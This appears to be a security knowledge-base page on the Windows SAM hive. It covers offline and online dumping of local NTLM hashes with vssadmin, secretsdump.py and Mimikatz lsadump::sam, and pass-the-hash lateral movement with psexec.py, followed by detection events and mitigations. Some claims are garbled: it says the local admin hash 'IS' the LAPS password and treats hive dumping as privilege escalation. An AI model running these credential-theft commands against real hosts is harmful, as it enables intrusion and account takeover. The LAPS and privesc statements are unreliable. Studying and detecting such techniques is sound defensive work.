---
title: SAM Database (Local Account Store)
type: concept
created: 2026-09-06
updated: 2026-09-06
tags: [windows, credential-access, sam, local-admins]
---

# SAM Database (Local Account Store)

The **SAM** (Security Account Manager) is a Windows registry hive at
`%SystemRoot%\System32\config\SAM` (with the `SYSTEM` hive for the boot key)
that stores **local account** password hashes (NTLM). It's the on-disk
counterpart to [[lsass]] (in-memory) and the local analog to
[[ntds-dit]] (domain accounts). Dumping SAM is how you recover **local
admin** hashes on a host for privesc and lateral movement.

## What you get

- **Local account NTLM hashes** — `Administrator`, `DefaultAccount`, any
  local users. The local `Administrator` NT hash is the classic
  **local privesc** and **lateral** credential (via [[pass-the-hash-and-ticket|PtH]]
  / [[pass-the-key|PtK]] on that host, or reused elsewhere).
- **LAPS password** (when [[laps]] is deployed) — stored as the local
  `Administrator` password, also recoverable from SAM.
- Feeds **Impacket**/Mimikatz local auth, `secretsdump.py -sam`.

## Offline extraction

```bash
# Copy the SAM + SYSTEM hives, then:
secretsdump.py -sam "D:\SAM" -system "D:\SYSTEM"
# Output: local accounts (Administrator, etc.) with NTLM hashes
```

```powershell
# On the host — vshadow the system volume, or copy the hives live
vssadmin create shadow /for=C:
# copy C:\Windows\System32\config\SAM and \SYSTEM

# Mimikatz (on the host, online)
lsadump::sam
```

## Online extraction

- **Mimikatz `lsadump::sam`** live (needs `SeBackupPrivilege` / SYSTEM).
- **Impacket `secretsdump.py -sam -system`** against the live hives.
- Often paired with a [[lsass]] dump on the same host (SAM for the stored
  hashes, LSASS for the live session's tickets/keys).

## Local privesc & lateral use

```bash
# Recover the local Administrator hash from SAM, then:
# 1) Local privesc (already on the host):
secretsdump.py -sam SAM -system SYSTEM            # get the NT hash
# 2) Lateral movement to another host (if the local admin password is the
#    same domain-wide, or via PtH):
psexec.py -hashes <lm>:<nt> DOMAIN/Administrator@<other-host>
# 3) LAPS — the local admin hash IS the LAPS password, read it from AD:
#    (see laps)
```

## Detection

- **File access** to `C:\Windows\System32\config\SAM` / `SYSTEM` (4663,
  Sysmon 11).
- **VSS creation** on the system volume (same tell as [[ntds-dit]]).
- **Mimikatz/Impacket command lines** (4688) referencing `lsadump::sam` /
  `-sam`.
- A `secretsdump`/SAM dump from a non-baseline process.

## Mitigations

- **Unique local admin per host** — [[laps]] defeats "same admin password
  everywhere" lateral movement.
- **Credential Guard / LSASS PPL** — limits the online path.
- **BitLocker** on the system volume — blocks the offline SAM read.
- **Tiered admin model** — [[ad-tiering-and-hardening]]: low-trust hosts
  don't hold reusable local admin creds.

## Links

- [[credential-dumping]] — the on-host secret stores map (SAM is the local offline one)
- [[laps]] — the local admin password it often holds (and how to read it from AD)
- [[lsass]] — the in-memory credential store (complementary dump)
- [[ntds-dit]] — the domain-side credential store
- [[pass-the-hash-and-ticket|PtH/PtT]] — what you do with the recovered hashes
- [[pass-the-key|PtK]] — local admin keys for lateral
- [[ad-tiering-and-hardening]] — the local-admin hardening baseline

## References

- [ired.team: SAM dump](https://www.ired.team/offensive-security-experiments/post-exploitation)
- [Impacket secretsdump.py](https://docs.impacket-project.org/)
- [Mimikatz lsadump::sam](https://mimikatz-project.github.io/)
